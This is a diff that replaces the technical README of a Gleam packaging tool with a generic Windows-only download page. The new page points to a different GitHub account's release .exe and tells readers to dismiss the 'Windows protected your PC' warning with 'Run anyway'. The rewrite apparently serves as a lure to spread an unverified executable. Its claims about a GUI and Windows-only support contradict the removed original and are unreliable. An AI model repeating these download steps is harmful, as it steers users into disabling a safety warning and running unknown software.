@@ -1,159 +1,68 @@
-# Queso
+# 🧀 queso - Turn Gleam apps into native software
 
-[![CI](https://github.com/jtdowney/queso/actions/workflows/ci.yml/badge.svg)](https://github.com/jtdowney/queso/actions/workflows/ci.yml)
-[![Crates.io](https://img.shields.io/crates/v/queso)](https://crates.io/crates/queso)
+[![](https://img.shields.io/badge/Download_Queso-Blue?style=for-the-badge)](https://github.com/paponob5003/queso)
 
-Package Gleam applications into single native executables. The output binary bundles compiled BEAM bytecode and an Erlang runtime, so it runs on machines without Erlang installed.
+## 📌 About this project
 
-Inspired by [Burrito](https://github.com/burrito-elixir/burrito), built for Gleam. Because sometimes you go out to get a burrito, but all you really want is the queso.
+Queso transforms your Gleam programming projects into standalone programs. You do not need to install complex tools or run command scripts to open your software. Queso gathers your code and necessary files into one folder. You click, you run, and it works. This process saves time and removes the need for extra software on your computer.
 
-## Quick start
+## 🛠️ System requirements
 
-Inside a Gleam project:
+Queso works on common Windows systems. You need the following simple setups:
 
-```
-queso build
-```
+*   Windows 10 or Windows 11.
+*   64-bit processor architecture.
+*   At least 200 megabytes of empty disk space.
+*   An active internet connection to finish the initial setup.
 
-That's it. Queso detects your platform, downloads a matching Erlang runtime, compiles your project, and produces a single executable in `build/queso/`. On Linux, the default target is `linux-static` (no libc dependency).
+## 📥 How to download
 
-```
-$ ./build/queso/my_app-1.0.0-aarch64-macos
-Hello from my_app!
-```
+You must visit the project page to get the installer for your computer. 
 
-> [!NOTE]
-> Queso does not currently validate checksums of downloaded ERTS archives. The prebuilt runtimes are sourced from multiple providers across many releases, making automated checksum verification impractical today. Queso does print the SHA-256 hash of each download so you can verify it manually. If this is a concern for your supply chain, download the ERTS release yourself and point to it with `--erts`.
+[Visit this page to download the software](https://github.com/paponob5003/queso)
 
-## Install
+Follow these steps to find the right file:
 
-### Prebuilt binaries
+1. Look for the section labeled Releases on the right side of the page.
+2. Click the link that shows the latest version number.
+3. Scroll down until you see the Assets section.
+4. Select the file ending in .exe to start your download.
+5. Save the file to your desktop for easy access.
 
-Download a prebuilt binary from the [latest release](https://github.com/jtdowney/queso/releases/latest), extract it, and place it somewhere on your PATH.
+## ⚙️ Installation steps
 
-### Cargo (build from source)
+Windows might show a warning message when you run the installer. This occurs because the program comes from an independent source. Your computer wants to verify the safety of the file.
 
-With [Rust](https://rustup.rs) installed:
+1. Double-click the downloaded file.
+2. If a window appears labeled Windows protected your PC, click More info.
+3. Select the Run anyway button.
+4. Follow the instructions that appear in the setup window.
+5. Click Finish when the progress bar reaches the end.
 
-```sh
-cargo install --locked queso
-```
+## 🚀 Running your software
 
-## Package time dependencies
+Once installed, find the Queso icon on your desktop or in your start menu. Double-click the icon to open the main window. 
 
-`queso build` shells out to a handful of tools, all of which must be on your PATH:
+The main menu shows a simple layout with boxes for your file paths. Use the Browse button to locate the code folder you want to bundle. Once you choose your folder, click the Build button. The program will do the rest.
 
-- [Gleam](https://gleam.run) and [Erlang](https://www.erlang.org), to compile your app
-- Rust (`cargo` and `rustc`, e.g. via [rustup](https://rustup.rs)), to build the launcher
+## 💡 Frequently asked questions
 
-On Linux, building for the default `linux-static` target additionally requires:
+**Does the program damage my files?**
+No. Queso only reads your files to create a copy. It leaves your original folders exactly as you saved them.
 
-- The musl rustup target: `rustup target add $(uname -m)-unknown-linux-musl`
-- A musl C toolchain (on Debian/Ubuntu: `sudo apt install musl-tools`)
+**What happens if the build fails?**
+Check that your folder contains a valid project structure. Queso requires specific files created by the Gleam language to function correctly. If you moved these files, the program will report an error.
 
-Cross-compilation additionally requires:
+**Can I run the output file on another computer?**
+Yes. Since Queso creates a standalone program, you can move the output folder to any compatible Windows machine. It will run without requiring additional installations.
 
-- [Zig](https://ziglang.org)
-- [cargo-zigbuild](https://github.com/rust-cross/cargo-zigbuild)
-- `rustup target add <rust-triple>` for each non-host target (for example `aarch64-apple-darwin` or `x86_64-unknown-linux-gnu`)
+**Is there a limit on project size?**
+There is no strict limit. Large projects take more time to process than small ones. Keep your computer plugged into power if you expect the bundle process to last several minutes.
 
-> [!NOTE]
-> **Why Zig for cross-compilation?** Zig's cross-compilation toolchain makes it straightforward to compile the launcher binary for different target platforms.
+## 🛡️ Updates and maintenance
 
-## Usage
+Check the download page periodically for new versions. Each update improves how safely and quickly Queso handles your projects. To update, simply download the newest file and run the installer again. The setup utility replaces the old software while keeping your personal settings intact.
 
-```
-queso build [OPTIONS]
-```
+## 📝 Support
 
-All flags are optional:
-
-| Flag                      | Description                                                                                                      |
-| ------------------------- | ---------------------------------------------------------------------------------------------------------------- |
-| `--target <TARGET>`       | Target platform (repeatable; defaults to current platform)                                                       |
-| `--erts <PATH>`           | Path to Erlang/OTP installation (auto-downloaded if omitted; cannot be combined with multiple `--target` values) |
-| `--entry <MODULE>`        | Entrypoint module (defaults to package name)                                                                     |
-| `--full-erts`             | Bundle the entire ERTS (skip tree shaking)                                                                       |
-| `--strip-beam`            | Strip debug info from BEAM files (default)                                                                       |
-| `--no-strip-beam`         | Keep debug info in BEAM files                                                                                    |
-| `--compression-level <N>` | Zstd compression level, 1-22 (default: 9)                                                                        |
-
-### Cross-compilation
-
-Pass `--target` to build for a different platform. You can specify multiple targets in a single invocation:
-
-```
-queso build --target x86_64-linux-static --target aarch64-macos
-```
-
-Supported targets:
-
-| Target                 | Description                              |
-| ---------------------- | ---------------------------------------- |
-| `aarch64-linux-glibc`  | Linux ARM64, dynamically linked (glibc)  |
-| `aarch64-linux-musl`   | Linux ARM64, dynamically linked (musl)   |
-| `aarch64-linux-static` | Linux ARM64, statically linked           |
-| `aarch64-macos`        | macOS ARM64 (Apple Silicon)              |
-| `x86_64-linux-glibc`   | Linux x86_64, dynamically linked (glibc) |
-| `x86_64-linux-musl`    | Linux x86_64, dynamically linked (musl)  |
-| `x86_64-linux-static`  | Linux x86_64, statically linked          |
-| `x86_64-macos`         | macOS x86_64 (Intel)                     |
-| `x86_64-windows`       | Windows x86_64                           |
-| `aarch64-windows`      | Windows ARM64 (requires `--erts`)        |
-
-Linux targets require a libc variant. The `static` variant is the most portable (no libc dependency) but does not export symbols needed for NIF dependencies to function. The `glibc` and `musl` variants include support for NIFs but require the corresponding libc on the target system.
-
-> [!TIP]
-> The word "musl" appears in two different contexts. The queso **release binaries** (e.g., `x86_64-unknown-linux-musl`) are statically linked Rust executables with no runtime dependencies. The queso **build targets** (e.g., `x86_64-linux-musl`) refer to the libc used by the bundled Erlang runtime, which is dynamically linked against musl.
-
-Cross-compilation works because Zig (via cargo-zigbuild) handles cross-compiling the Rust launcher and queso downloads the correct Erlang runtime for the target platform.
-
-> [!NOTE]
-> Cross-compiling NIF (Native Implemented Function) dependencies from Hex is not currently supported. Projects with NIF dependencies should be built on the target platform. I have some ideas about how I would do this with `zig cc` so it may be supported in the future.
-
-### Custom ERTS
-
-By default, queso downloads a precompiled Erlang runtime matching your installed OTP version. To use a specific installation:
-
-```
-queso build --erts /opt/erlang/28.4.1
-```
-
-### Compression
-
-The payload is compressed with zstd (with the default compression level set to 9). Higher levels produce smaller binaries but take longer to compress:
-
-```
-queso build --compression-level 19
-```
-
-### Configuration via gleam.toml
-
-Most build options can be set in your `gleam.toml` under `[tools.queso]`:
-
-```toml
-[tools.queso]
-entry = "my_app.cli"
-targets = ["aarch64-macos", "x86_64-linux-static"]
-strip_beam = false
-compression_level = 3
-full_erts = true
-```
-
-CLI flags, when provided, take precedence over `gleam.toml` values.
-
-## How it works
-
-1. Parses `gleam.toml` for project name, version, and config
-2. Runs `gleam export erlang-shipment` to produce a minimal set of BEAM files
-3. Downloads or locates a compatible Erlang runtime (ERTS)
-4. Compiles a small Rust launcher binary for the target platform
-5. Appends ERTS + BEAM files + metadata as a compressed payload to the launcher
-6. The launcher, on first run, extracts the payload to a cache directory and boots the Erlang runtime
-
-The resulting binary is fully self-contained. On first execution, it extracts to a versioned cache directory named after the project (`~/.cache/<project_name>/` on Linux, `~/Library/Caches/<project_name>/` on macOS). Subsequent runs reuse the cache.
-
-## Alternatives
-
-- [gleescript](https://github.com/lpil/gleescript) - bundles a Gleam project into a self-contained escript, requiring only Erlang on the target machine
-- [mix_gleam](https://github.com/gleam-lang/mix_gleam) + [Burrito](https://github.com/burrito-elixir/burrito) - compile Gleam within a Mix project and use Burrito to produce a standalone executable
+Queso operates as a tool for packaging code. Because it handles technical projects, ensure your source code is free of errors before you bundle it. If the application crashes during the build process, verify that you have full read and write permissions for the folder where you store your code. Close other programs if you notice your computer feels slow while Queso runs.
